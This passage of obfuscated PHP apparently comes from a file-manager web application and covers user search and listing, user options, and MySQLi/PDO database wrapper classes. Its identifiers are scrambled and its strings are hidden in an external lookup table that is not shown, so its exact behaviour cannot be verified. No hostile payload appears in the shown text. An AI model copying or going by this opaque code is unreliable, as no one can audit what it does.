$­à„éš¾[$Å´¨ÆŠ[853]]); } if (_get($­à„éš¾, $Å´¨ÆŠ[854], !1)) { $ûß«õ— = array($Å´¨ÆŠ[2409], $­à„éš¾[$Å´¨ÆŠ[854]]); if ($¼áÒ¯ºƒ[$‹­İ¦Ìª]) { $¼áÒ¯ºƒ[$‹­İ¦Ìª] = array($¼áÒ¯ºƒ[$‹­İ¦Ìª], $ûß«õ—, $Å´¨ÆŠ[2410]); } else { $¼áÒ¯ºƒ[$‹­İ¦Ìª] = $ûß«õ—; } } $äÜ†”³ = $this->_makeOrder($È¯ªÅ ´)->field($Å´¨ÆŠ[2665])->where($¼áÒ¯ºƒ)->join($äÆ·¨·)->selectPage(50); $this->_listDataApply($äÜ†”³[$Å´¨ÆŠ[446]]); return $äÜ†”³; } private function _makeOrder($Ô²²µ° = '') { $İ–¡î¹³ =& $_SERVER[öæÛ¿©¿]; $›€‡Èš = array($İ–¡î¹³[1538], $İ–¡î¹³[32], $İ–¡î¹³[2120], $İ–¡î¹³[2321], $İ–¡î¹³[2095], $İ–¡î¹³[232]); $¼„ÚĞê = array($İ–¡î¹³[533] => $İ–¡î¹³[534], $İ–¡î¹³[535] => $İ–¡î¹³[536]); $ıİ‡êĞà = Input::get($İ–¡î¹³[540], $İ–¡î¹³[7], $İ–¡î¹³[1916], $›€‡Èš); $‡‡´ËÎİ = Input::get($İ–¡î¹³[541], $İ–¡î¹³[7], $İ–¡î¹³[2224], array($İ–¡î¹³[2224], $İ–¡î¹³[535])); $‡‡´ËÎİ = $¼„ÚĞê[$‡‡´ËÎİ]; $Ô²²µ° = $Ô²²µ° . "\x75\x73\145\x72\56{$ıİ‡êĞà}\x20{$‡‡´ËÎİ}\x2c\40\x75\x73\145\x72\56\165\x73\x65\162\x49\104\40\141\x73\x63"; return $this->alias($İ–¡î¹³[2356])->order($Ô²²µ°); } public function listSearch($Çèù‰ˆØ) { $ãë˜ê± =& $_SERVER[öæÛ¿©¿]; $ú•”Ã = trim($Çèù‰ˆØ[$ãë˜ê±[2227]]); $—‹ô¬—Ê = explode($ãë˜ê±[53], $ú•”Ã); if (!$ú•”Ã || count($—‹ô¬—Ê) == 1) { return $this->listSearchNow($Çèù‰ˆØ); } $¾­®¼®İ = array($ãë˜ê±[446] => array()); foreach ($—‹ô¬—Ê as $úëğ‡«ß) { if (!trim($úëğ‡«ß)) { continue; } $Çèù‰ˆØ[$ãë˜ê±[2227]] = $úëğ‡«ß; $÷ëÆ’ß = $this->listSearchNow($Çèù‰ˆØ); $¾­®¼®İ[$ãë˜ê±[446]] = array_merge($¾­®¼®İ[$ãë˜ê±[446]], $÷ëÆ’ß[$ãë˜ê±[446]]); } $¾­®¼®İ[$ãë˜ê±[446]] = array_unique_by_key($¾­®¼®İ[$ãë˜ê±[446]], $ãë˜ê±[1538]); $¾­®¼®İ[$ãë˜ê±[443]] = array($ãë˜ê±[444] => count($¾­®¼®İ[$ãë˜ê±[446]]), $ãë˜ê±[440] => 20, $ãë˜ê±[429] => 1, $ãë˜ê±[445] => 1); return $¾­®¼®İ; } public function listSearchNow($’ ©ƒôŒ) { $à„‹•Ó =& $_SERVER[öæÛ¿©¿]; $äè ğ˜˜ = trim($’ ©ƒôŒ[$à„‹•Ó[2227]]); $‘˜ŞÁÂê = isset($’ ©ƒôŒ[$à„‹•Ó[2228]]) ? $’ ©ƒôŒ[$à„‹•Ó[2228]] : !1; $äè ğ˜˜ = str_replace($à„‹•Ó[2229], $à„‹•Ó[2230], trim($äè ğ˜˜)); $«ÌîßÕ® = array($à„‹•Ó[32] => array($à„‹•Ó[470], "\45{$äè ğ˜˜}\45"), $à„‹•Ó[381] => array($à„‹•Ó[470], "{$äè ğ˜˜}\45"), $à„‹•Ó[2427] => array($à„‹•Ó[470], "\45{$äè ğ˜˜}\x25"), $à„‹•Ó[1112] => $à„‹•Ó[2231]); if (Input::check($äè ğ˜˜, $à„‹•Ó[387])) { $«ÌîßÕ®[$à„‹•Ó[1538]] = array($à„‹•Ó[470], "{$äè ğ˜˜}\x25"); $«ÌîßÕ®[$à„‹•Ó[2644]] = array($à„‹•Ó[470], "{$äè ğ˜˜}\x25"); } if (!$äè ğ˜˜) { $«ÌîßÕ® = array(); } if (isset($’ ©ƒôŒ[$à„‹•Ó[842]])) { $«ÌîßÕ®[$à„‹•Ó[842]] = $’ ©ƒôŒ[$à„‹•Ó[842]]; } $«ÌîßÕ® = $this->parseWhereLike($«ÌîßÕ®); $£»Òåš = $this->_makeOrder()->where($«ÌîßÕ®)->selectPage(20); if (!$£»Òåš || count($£»Òåš[$à„‹•Ó[446]]) < 5 && Input::check($äè ğ˜˜, $à„‹•Ó[394])) { $Ğ„©¦ùò = $this->_searchFromMeta($à„‹•Ó[547], $äè ğ˜˜, 10); $ñ‹Æ¦õ¥ = $this->_searchFromMeta($à„‹•Ó[548], $äè ğ˜˜, 10); $ğë Âñ = array_merge($Ğ„©¦ùò, $ñ‹Æ¦õ¥, $£»Òåš[$à„‹•Ó[446]]); $£»Òåš[$à„‹•Ó[446]] = array_unique_by_key($ğë Âñ, $à„‹•Ó[1538]); $£»Òåš[$à„‹•Ó[443]][$à„‹•Ó[444]] = count($£»Òåš[$à„‹•Ó[446]]); $£»Òåš[$à„‹•Ó[443]][$à„‹•Ó[445]] = ceil($£»Òåš[$à„‹•Ó[443]][$à„‹•Ó[444]] / $£»Òåš[$à„‹•Ó[443]][$à„‹•Ó[440]]); } $this->_listDataApply($£»Òåš[$à„‹•Ó[446]]); $this->_filterByGroup($£»Òåš, $‘˜ŞÁÂê); return $£»Òåš; } private function _filterByGroup(&$ƒâ“±àä, $óÃ…ãğ) { $¹±ÓÒ¨ƒ =& $_SERVER[öæÛ¿©¿]; if (!$óÃ…ãğ) { return $ƒâ“±àä; } foreach ($ƒâ“±àä[$¹±ÓÒ¨ƒ[446]] as $­üÅ¶®Ş => &$÷û½Î±) { $Û±Šõäà = array_to_keyvalue($÷û½Î±[$¹±ÓÒ¨ƒ[1439]], $¹±ÓÒ¨ƒ[12], $¹±ÓÒ¨ƒ[1440]); if (!in_array($óÃ…ãğ, $Û±Šõäà)) { unset($ƒâ“±àä[$¹±ÓÒ¨ƒ[446]][$­üÅ¶®Ş]); } } unset($÷û½Î±); $ƒâ“±àä[$¹±ÓÒ¨ƒ[446]] = array_values($ƒâ“±àä[$¹±ÓÒ¨ƒ[446]]); $ƒâ“±àä[$¹±ÓÒ¨ƒ[443]] = array($¹±ÓÒ¨ƒ[2391] => count($ƒâ“±àä[$¹±ÓÒ¨ƒ[446]]), $¹±ÓÒ¨ƒ[2389] => $ƒâ“±àä[$¹±ÓÒ¨ƒ[443]][$¹±ÓÒ¨ƒ[440]], $¹±ÓÒ¨ƒ[2388] => 1, $¹±ÓÒ¨ƒ[2390] => 1); } private function _searchFromMeta($µ‘Ç¼Ê„, $“”˜Œì§, $Ö£ùƒ‚) { $­€ÅÄå© =& $_SERVER[öæÛ¿©¿]; $“”˜Œì§ = strtolower($“”˜Œì§); $ı¤Ç´ã = array($­€ÅÄå©[95] => $µ‘Ç¼Ê„, $­€ÅÄå©[451] => array($­€ÅÄå©[470], "\45{$“”˜Œì§}\x25")); $ı¤Ç´ã = $this->parseWhereLike($ı¤Ç´ã); $Ê¼‘àÌş = Model($­€ÅÄå©[2666])->where($ı¤Ç´ã)->limit($Ö£ùƒ‚)->select(); if (!$Ê¼‘àÌş) { return array(); } $Ê¼‘àÌş = array_to_keyvalue($Ê¼‘àÌş, $­€ÅÄå©[12], $­€ÅÄå©[1538]); $×¶†¶·ƒ = $this->where(array($­€ÅÄå©[1916] => array($­€ÅÄå©[7], $Ê¼‘àÌş)))->select(); if (!$×¶†¶·ƒ) { return array(); } return $×¶†¶·ƒ; } private function _listDataApplyItem($»íé¢Ñ¹) { $—üã¶¸ = array($»íé¢Ñ¹); $this->_listDataApply($—üã¶¸); return $—üã¶¸[0]; } private function _listDataApply(&$ÚÃ¥©£Ÿ) { $İ‚ğ¤›Š =& $_SERVER[öæÛ¿©¿]; if (!$ÚÃ¥©£Ÿ) { return; } array_remove_key($ÚÃ¥©£Ÿ, $İ‚ğ¤›Š[998]); $˜é—·…Ó = array_to_keyvalue($ÚÃ¥©£Ÿ, $İ‚ğ¤›Š[12], $İ‚ğ¤›Š[1538]); $this->_listAppendGroup($ÚÃ¥©£Ÿ, $˜é—·…Ó); $this->_listAppendMeta($ÚÃ¥©£Ÿ, $˜é—·…Ó); $this->_listAppendSourceRoot($ÚÃ¥©£Ÿ, $˜é—·…Ó); } private function _listAppendSourceRoot(&$Ó¶Ï®, $Ô‘éÑ™) { $øä‰›¿ =& $_SERVER[öæÛ¿©¿]; $Ø±¢âïÌ = Model($øä‰›¿[925])->listSourceRoot(SourceModel::TYPE_USER, $Ô‘éÑ™); $Ø±¢âïÌ = array_to_keyvalue($Ø±¢âïÌ, $øä‰›¿[585]); $Ø±¢âïÌ = array_remove_key($Ø±¢âïÌ, $øä‰›¿[585]); foreach ($Ó¶Ï® as &$ûó–¼‰Ş) { $ûó–¼‰Ş[$øä‰›¿[90]] = $Ø±¢âïÌ[$ûó–¼‰Ş[$øä‰›¿[1538]]] ? $Ø±¢âïÌ[$ûó–¼‰Ş[$øä‰›¿[1538]]] : array(); } unset($ûó–¼‰Ş); } private function _listAppendGroup(&$Òåı‚Ô¦, $ßö®ŞŒÀ) { $Ó†›ƒ¡© =& $_SERVER[öæÛ¿©¿]; $Æ°ÍÊîá = array($Ó†›ƒ¡©[1538] => array($Ó†›ƒ¡©[7], $ßö®ŞŒÀ)); $ ˆäË = Model($Ó†›ƒ¡©[2223])->where($Æ°ÍÊîá)->select(); $Â÷´ÅïÅ = array_to_keyvalue($ ˆäË, $Ó†›ƒ¡©[12], $Ó†›ƒ¡©[1440]); $Â÷´ÅïÅ = array_remove_value(array_unique($Â÷´ÅïÅ), $Ó†›ƒ¡©[229]); if (!$Â÷´ÅïÅ || !$ ˆäË) { return; } $Æ°ÍÊîá = array($Ó†›ƒ¡©[1440] => array($Ó†›ƒ¡©[7], $Â÷´ÅïÅ)); $›Øñ¶« = Model($Ó†›ƒ¡©[1438])->field($Ó†›ƒ¡©[2667])->where($Æ°ÍÊîá)->select(); $›Øñ¶« = array_to_keyvalue($›Øñ¶«, $Ó†›ƒ¡©[1440]); $ ˆäË = array_to_keyvalue_group($ ˆäË, $Ó†›ƒ¡©[1538]); foreach ($ ˆäË as &$ÙÃÂ‚Š÷) { $‡„¢ñ» = array(); foreach ($ÙÃÂ‚Š÷ as $ÏÄ·ùØó) { if (!$ÏÄ·ùØó[$Ó†›ƒ¡©[1585]]) { continue; } $×·şò¥Ä = Model($Ó†›ƒ¡©[587])->listData($ÏÄ·ùØó[$Ó†›ƒ¡©[1585]]); $‡„¢ñ»[] = array($Ó†›ƒ¡©[1440] => $ÏÄ·ùØó[$Ó†›ƒ¡©[1440]], $Ó†›ƒ¡©[2668] => $›Øñ¶«[$ÏÄ·ùØó[$Ó†›ƒ¡©[1440]]][$Ó†›ƒ¡©[32]], $Ó†›ƒ¡©[600] => $›Øñ¶«[$ÏÄ·ùØó[$Ó†›ƒ¡©[1440]]][$Ó†›ƒ¡©[600]], $Ó†›ƒ¡©[498] => $×·şò¥Ä); } $ÙÃÂ‚Š÷ = $‡„¢ñ»; } unset($ÙÃÂ‚Š÷); foreach ($Òåı‚Ô¦ as &$õ¼—¥•) { $õ¼—¥•[$Ó†›ƒ¡©[1439]] = array(); if (isset($ ˆäË[$õ¼—¥•[$Ó†›ƒ¡©[1538]]])) { $õ¼—¥•[$Ó†›ƒ¡©[1439]] = $ ˆäË[$õ¼—¥•[$Ó†›ƒ¡©[1538]]]; } } unset($õ¼—¥•); } public function userAppendGroup($ü˜Ú§ø) { $ßµëÍÔ =& $_SERVER[öæÛ¿©¿]; if (!$ü˜Ú§ø) { return array(); } $this->_listAppendGroup($ü˜Ú§ø, array_to_keyvalue($ü˜Ú§ø, $ßµëÍÔ[12], $ßµëÍÔ[1538])); return $ü˜Ú§ø; } private function _listAppendMeta(&$éÓì¢¿Â, $ôúò”Á‹) { $„ıƒæÜ¸ =& $_SERVER[öæÛ¿©¿]; $ã‚ŠâµÑ = UserJobModel::JOB_KEY; $¿î¼İÊÊ = array($„ıƒæÜ¸[2219]); $Œ»È¹‘ = array($„ıƒæÜ¸[1538] => array($„ıƒæÜ¸[7], $ôúò”Á‹)); $£—º›Öù = Model($„ıƒæÜ¸[2643])->where($Œ»È¹‘)->select(); $ŠÔ×œšÂ = array(); foreach ($£—º›Öù as $¸Ÿ½ÄÃ¬) { $ö©§ğ“¶ = $¸Ÿ½ÄÃ¬[$„ıƒæÜ¸[1538]]; if (!isset($ŠÔ×œšÂ[$ö©§ğ“¶])) { $ŠÔ×œšÂ[$ö©§ğ“¶] = array(); } $ŠÔ×œšÂ[$ö©§ğ“¶][$¸Ÿ½ÄÃ¬[$„ıƒæÜ¸[95]]] = $¸Ÿ½ÄÃ¬[$„ıƒæÜ¸[451]]; } $‘Çù¢©ğ = Model($„ıƒæÜ¸[2669]); foreach ($éÓì¢¿Â as &$šê“ñĞŠ) { $ö©§ğ“¶ = $šê“ñĞŠ[$„ıƒæÜ¸[1538]]; $ÕÙÆÙÇ¿ = isset($ŠÔ×œšÂ[$ö©§ğ“¶]) ? $ŠÔ×œšÂ[$ö©§ğ“¶] : array(); $šê“ñĞŠ[$„ıƒæÜ¸[551]] = array_field_key($ÕÙÆÙÇ¿, $¿î¼İÊÊ); $šê“ñĞŠ[$„ıƒæÜ¸[2670]] = array(); if (isset($ÕÙÆÙÇ¿[$ã‚ŠâµÑ])) { $šê“ñĞŠ[$„ıƒæÜ¸[2670]] = $‘Çù¢©ğ->getUserJobInfo($ÕÙÆÙÇ¿[$ã‚ŠâµÑ]); } } unset($šê“ñĞŠ); } protected function groupUserAll($ÆşâÁƒ§) { $×Ş¤¥’ =& $_SERVER[öæÛ¿©¿]; if (!$ÆşâÁƒ§) { return !1; } $ı´¨ø™® = Model($×Ş¤¥’[2223])->field($×Ş¤¥’[1538])->where(array($×Ş¤¥’[1440] => array($×Ş¤¥’[7], $ÆşâÁƒ§)))->select(); $ı´¨ø™® = array_to_keyvalue($ı´¨ø™®, $×Ş¤¥’[12], $×Ş¤¥’[1538]); return array_unique($ı´¨ø™®); } public function userSearch($­Å™áŒ¢, $ı“«´• = "\x2a") { return Model($_SERVER[öæÛ¿©¿][613])->where($­Å™áŒ¢)->field($ı“«´•)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\157\x70\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ü‹ğó—æ) { return "\125\x73\145\x72\x4f\x70\164\x69\x6f\156\x5f{$ü‹ğó—æ}\137" . KodUser::id(); } protected function filterWhere($—û„€¿ğ) { $—û„€¿ğ[$_SERVER[öæÛ¿©¿][1538]] = KodUser::id(); return $—û„€¿ğ; } public function cacheRemoveUser($Õ‰Èëˆ”, $í€—öîÇ) { return Cache::remove("\125\163\x65\x72\117\160\164\151\157\x6e\x5f{$Õ‰Èëˆ”}\137" . $í€—öîÇ); } protected function optionDefault($ÇĞ¯Ä­ = '') { $¸Ï¯¨âÉ =& $_SERVER[öæÛ¿©¿]; if ($ÇĞ¯Ä­ == $¸Ï¯¨âÉ[12]) { return $GLOBALS[$¸Ï¯¨âÉ[6]][$¸Ï¯¨âÉ[2671]]; } if ($ÇĞ¯Ä­ == $¸Ï¯¨âÉ[2672]) { return $GLOBALS[$¸Ï¯¨âÉ[6]][$¸Ï¯¨âÉ[2673]]; } } } goto C‹ì¢’ñ¤÷; cÚÅèÚËØ: class DbMysqli extends Db { public function __construct($¶û‰æè = '') { $àÙáæ‘´ =& $_SERVER[öæÛ¿©¿]; if (!extension_loaded($àÙáæ‘´[1024])) { think_exception(think_lang($àÙáæ‘´[14]) . $àÙáæ‘´[1025]); } if (!empty($¶û‰æè)) { $this->config = $¶û‰æè; if (empty($this->config[$àÙáæ‘´[17]])) { $this->config[$àÙáæ‘´[17]] = $àÙáæ‘´[12]; } } } public function connect($ËÄòåÒ = '', $¼õî•¯İ = 0) { $ç„¢Úœ =& $_SERVER[öæÛ¿©¿]; if (!isset($this->linkID[$¼õî•¯İ])) { if (empty($ËÄòåÒ)) { $ËÄòåÒ = $this->config; } $this->linkID[$¼õî•¯İ] = new mysqli($ËÄòåÒ[$ç„¢Úœ[995]], $ËÄòåÒ[$ç„¢Úœ[997]], $ËÄòåÒ[$ç„¢Úœ[998]], $ËÄòåÒ[$ç„¢Úœ[21]], $ËÄòåÒ[$ç„¢Úœ[996]] ? intval($ËÄòåÒ[$ç„¢Úœ[996]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÇÖ™Ìş = $this->linkID[$¼õî•¯İ]->server_version; $this->linkID[$¼õî•¯İ]->query($ç„¢Úœ[999] . think_config($ç„¢Úœ[1000]) . $ç„¢Úœ[58]); if ($ÇÖ™Ìş > $ç„¢Úœ[1001]) { $this->linkID[$¼õî•¯İ]->query($ç„¢Úœ[1002]); } $this->connected = !0; if (1 != think_config($ç„¢Úœ[22])) { unset($this->config); } } return $this->linkID[$¼õî•¯İ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($İÚğ¾¨Œ) { $Õú‚È¯• =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $İÚğ¾¨Œ; if ($this->queryID) { $this->free(); } think_action_status($Õú‚È¯•[23], 1); think_status($Õú‚È¯•[24]); $this->queryID = $this->_linkID->query($İÚğ¾¨Œ); if ($this->_linkID->more_results()) { while (($ï¬ô¢ìö = $this->_linkID->next_result()) != NULL) { $ï¬ô¢ìö->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($µ»û¹›) { $Ë´™êÌ‘ =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $µ»û¹›; if ($this->queryID) { $this->free(); } think_action_status($Ë´™êÌ‘[25], 1); think_status($Ë´™êÌ‘[24]); $¤…ù×ÁÂ = $this->_linkID->query($µ»û¹›); $this->debug(); if (!1 === $¤…ù×ÁÂ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‰ßå¢ºõ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$‰ßå¢ºõ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $†¿µÜâÛ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$†¿µÜâÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $ãëÚ»ÈÛ = array(); if ($this->numRows > 0) { for ($Ùå¨ÆìÜ = 0; $Ùå¨ÆìÜ < $this->numRows; $Ùå¨ÆìÜ++) { $ãëÚ»ÈÛ[$Ùå¨ÆìÜ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ãëÚ»ÈÛ; } public function getFields($Åš·ßİœ) { $µõ¹ıÃ¼ =& $_SERVER[öæÛ¿©¿]; $¦Òƒ€õª = $this->query($µõ¹ıÃ¼[1006] . $this->parseKey($Åš·ßİœ)); $¥‘çÏÏ¸ = array(); if ($¦Òƒ€õª) { foreach ($¦Òƒ€õª as $®ÄÍ§Æ¡ => $ÂŞŸ®éô) { $¥‘çÏÏ¸[$ÂŞŸ®éô[$µõ¹ıÃ¼[31]]] = array($µõ¹ıÃ¼[32] => $ÂŞŸ®éô[$µõ¹ıÃ¼[31]], $µõ¹ıÃ¼[33] => $ÂŞŸ®éô[$µõ¹ıÃ¼[34]], $µõ¹ıÃ¼[35] => (bool) ($ÂŞŸ®éô[$µõ¹ıÃ¼[36]] === $µõ¹ıÃ¼[12]), $µõ¹ıÃ¼[37] => $ÂŞŸ®éô[$µõ¹ıÃ¼[38]], $µõ¹ıÃ¼[39] => strtolower($ÂŞŸ®éô[$µõ¹ıÃ¼[40]]) == $µõ¹ıÃ¼[41], $µõ¹ıÃ¼[42] => strtolower($ÂŞŸ®éô[$µõ¹ıÃ¼[43]]) == $µõ¹ıÃ¼[44]); } } return $¥‘çÏÏ¸; } public function getTables($ö±á•´» = '') { $éÀôŸ¼Ÿ =& $_SERVER[öæÛ¿©¿]; $ğ¡ÖŒ§Ã = !empty($ö±á•´») ? $éÀôŸ¼Ÿ[1008] . $ö±á•´» . $éÀôŸ¼Ÿ[1009] : $éÀôŸ¼Ÿ[1010]; $øñƒ½Æ° = $this->query($ğ¡ÖŒ§Ã); $šá˜è®Ö = array(); if ($øñƒ½Æ°) { foreach ($øñƒ½Æ° as $éåôâÊ => $åòî•Äª) { $šá˜è®Ö[$éåôâÊ] = current($åòî•Äª); } } return $šá˜è®Ö; } public function replace($øœ‹Š˜, $í•œ©ı = array()) { $©²ŠÈ®ø =& $_SERVER[öæÛ¿©¿]; foreach ($øœ‹Š˜ as $Šğ†‡Ö° => $­ÂşËæß) { $Óñ†–Ï¿ = $this->parseValue($­ÂşËæß); if (is_scalar($Óñ†–Ï¿)) { $ÚíÜ‹˜[] = $Óñ†–Ï¿; $ëı·æÓ[] = $this->parseKey($Šğ†‡Ö°); } } $í¾õîºÖ = $©²ŠÈ®ø[1011] . $this->parseTable($í•œ©ı[$©²ŠÈ®ø[358]]) . $©²ŠÈ®ø[1012] . implode($©²ŠÈ®ø[50], $ëı·æÓ) . $©²ŠÈ®ø[1013] . implode($©²ŠÈ®ø[50], $ÚíÜ‹˜) . $©²ŠÈ®ø[1014]; return $this->execute($í¾õîºÖ); } public function insertAll($•˜ó¸Å, $ ùº‰‡Á = array(), $Øµ´®“ = false) { $ì‰´­¾™ =& $_SERVER[öæÛ¿©¿]; if (!is_array($•˜ó¸Å[0])) { return !1; } $¨º¥Ê–« = array_keys($•˜ó¸Å[0]); $ø¾øĞ½ş = array(); foreach ($•˜ó¸Å as $Ÿíöûâ—) { $À¼‹Ï«» = array(); foreach ($Ÿíöûâ— as $…œŞÊ¾º => $ª•Áó¤Ä) { $ª•Áó¤Ä = $this->parseValue($ª•Áó¤Ä); if (is_scalar($ª•Áó¤Ä)) { $À¼‹Ï«»[] = $ª•Áó¤Ä; } } $ø¾øĞ½ş[] = $ì‰´­¾™[338] . implode($ì‰´­¾™[50], $À¼‹Ï«») . $ì‰´­¾™[1014]; } array_walk($¨º¥Ê–«, array($this, $ì‰´­¾™[1015])); $§ÅÈâ§ƒ = $Øµ´®“ ? $ì‰´­¾™[1016] : $ì‰´­¾™[1017]; $§ÅÈâ§ƒ = $ì‰´­¾™[1017]; $ËÌÀ„” = $§ÅÈâ§ƒ . $ì‰´­¾™[1018] . $this->parseTable($ ùº‰‡Á[$ì‰´­¾™[358]]) . $ì‰´­¾™[1012] . implode($ì‰´­¾™[50], $¨º¥Ê–«) . $ì‰´­¾™[1019] . implode($ì‰´­¾™[50], $ø¾øĞ½ş); if ($Øµ´®“) { $–öø£õä = array(); foreach ($¨º¥Ê–« as $…œŞÊ¾º) { if ($…œŞÊ¾º == $ì‰´­¾™[232] || $…œŞÊ¾º == $ì‰´­¾™[1020]) { continue; } $–öø£õä[] = $…œŞÊ¾º . $ì‰´­¾™[1021] . $…œŞÊ¾º . $ì‰´­¾™[1014]; } $ËÌÀ„” .= $ì‰´­¾™[1022] . implode($ì‰´­¾™[50], $–öø£õä); } return $this->execute($ËÌÀ„”); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $İ”³ÌÒ« =& $_SERVER[öæÛ¿©¿]; $this->error = $this->_linkID->errno . $İ”³ÌÒ«[4] . $this->_linkID->error; if ($İ”³ÌÒ«[12] != $this->queryStr) { $this->error .= LNG($İ”³ÌÒ«[48]) . $this->queryStr; } think_trace($this->error, $İ”³ÌÒ«[12], $İ”³ÌÒ«[49]); return $this->error; } public function escapeString($«½ÆÍ â) { if ($this->_linkID) { return $this->_linkID->real_escape_string($«½ÆÍ â); } else { return addslashes($«½ÆÍ â); } } public function parseKey(&$èÄÙñ‰á, $Ş¾¥²—è = true) { $’«Ù†«Œ =& $_SERVER[öæÛ¿©¿]; if ($Ş¾¥²—è) { $èÄÙñ‰á = $this->parseKeyCheck($èÄÙñ‰á); } if ($èÄÙñ‰á != $’«Ù†«Œ[221] && !preg_match($’«Ù†«Œ[1023], $èÄÙñ‰á)) { $èÄÙñ‰á = $’«Ù†«Œ[472] . trim($èÄÙñ‰á, $’«Ù†«Œ[472]) . $’«Ù†«Œ[472]; } return $èÄÙñ‰á; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÃÅı®›… = '') { $ñä¦¬¤ =& $_SERVER[öæÛ¿©¿]; if (!class_exists($ñä¦¬¤[1026])) { think_exception(think_lang($ñä¦¬¤[14]) . $ñä¦¬¤[1027]); } if (!empty($ÃÅı®›…)) { $this->config = $ÃÅı®›…; if (empty($this->config[$ñä¦¬¤[17]])) { $this->config[$ñä¦¬¤[17]] = array(); } } } public function connect($†õüØ¾— = '', $´ÍĞúì = 0) { $Ù¾¢´•­ =& $_SERVER[öæÛ¿©¿]; if (!isset($this->linkID[$´ÍĞúì])) { if (empty($†õüØ¾—)) { $†õüØ¾— = $this->config; } $¥Ä¬ıŒ = !empty($†õüØ¾—[$Ù¾¢´•­[17]][$Ù¾¢´•­[18]]) ? $†õüØ¾—[$Ù¾¢´•­[17]][$Ù¾¢´•­[18]] : $this->pconnect; if ($¥Ä¬ıŒ) { $†õüØ¾—[$Ù¾¢´•­[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$´ÍĞúì] = new PDO($†õüØ¾—[$Ù¾¢´•­[1028]], $†õüØ¾—[$Ù¾¢´•­[997]], $†õüØ¾—[$Ù¾¢´•­[998]], $†õüØ¾—[$Ù¾¢´•­[17]]); } catch (PDOException $”œ²“¯) { think_exception($”œ²“¯->getMessage()); } $this->dbType = $this->_getDsnType($†õüØ¾—[$Ù¾¢´•­[1028]]); if (in_array($this->dbType, array($Ù¾¢´•­[1029], $Ù¾¢´•­[1030], $Ù¾¢´•­[1031], $Ù¾¢´•­[1032]))) { think_exception($Ù¾¢´•­[1033] . $this->dbType . $Ù¾¢´•­[1034] . $this->dbType . $Ù¾¢´•­[1035]); } if (!$this->linkID[$´ÍĞúì]) { think_exception($Ù¾¢´•­[1036]); } try { $this->linkID[$´ÍĞúì]->exec($Ù¾¢´•­[1037] . think_config($Ù¾¢´•­[1000])); } catch (Exception $”œ²“¯) { } $this->connected = !0; if (1 != think_config($Ù¾¢´•­[22])) { unset($this->config); } } return $this->linkID[$´ÍĞúì]; } public function free() { $this->PDOStatement = null; } public function query($ĞìÆßÕ¡, $Õ’‰—¤î = array()) { $ÛÊÓÏÔ =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ĞìÆßÕ¡; if (!empty($Õ’‰—¤î)) { $this->queryStr .= $ÛÊÓÏÔ[1038] . print_r($Õ’‰—¤î, !0) . $ÛÊÓÏÔ[1039]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÛÊÓÏÔ[23], 1); think_status($ÛÊÓÏÔ[24]); $this->PDOStatement = $this->_linkID->prepare($ĞìÆßÕ¡); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ã¶Í¯ªû = $this->PDOStatement->execute($Õ’‰—¤î); $this->debug(); if (!1 === $Ã¶Í¯ªû) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($³º¡¡ö, $ÅğÒè£ê = array()) { $ÍÁïÏòå =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $³º¡¡ö; if (!empty($ÅğÒè£ê)) { $this->queryStr .= $ÍÁïÏòå[1038] . print_r($ÅğÒè£ê, !0) . $ÍÁïÏòå[1039]; } $â¥†‹¼í = !1; if ($this->dbType == $ÍÁïÏòå[1032]) { if (preg_match($ÍÁïÏòå[1040], $this->queryStr, $Í²»Şé )) { $this->table = think_config($ÍÁïÏòå[1041]) . str_ireplace(think_config($ÍÁïÏòå[1042]), $ÍÁïÏòå[463], $Í²»Şé [2]); $â¥†‹¼í = (bool) $this->query($ÍÁïÏòå[1043] . strtoupper($this->table) . $ÍÁïÏòå[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÍÁïÏòå[25], 1); think_status($ÍÁïÏòå[24]); $this->PDOStatement = $this->_linkID->prepare($³º¡¡ö); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $”ß·”šŸ = $this->PDOStatement->execute($ÅğÒè£ê); $this->debug(); if (!1 === $”ß·”šŸ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($â¥†‹¼í || preg_match($ÍÁïÏòå[1044], $³º¡¡ö)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Îææ© = $this->_linkID->commit(); $this->transTimes = 0; if (!$Îææ©) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢´şß¯ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¢´şß¯) { 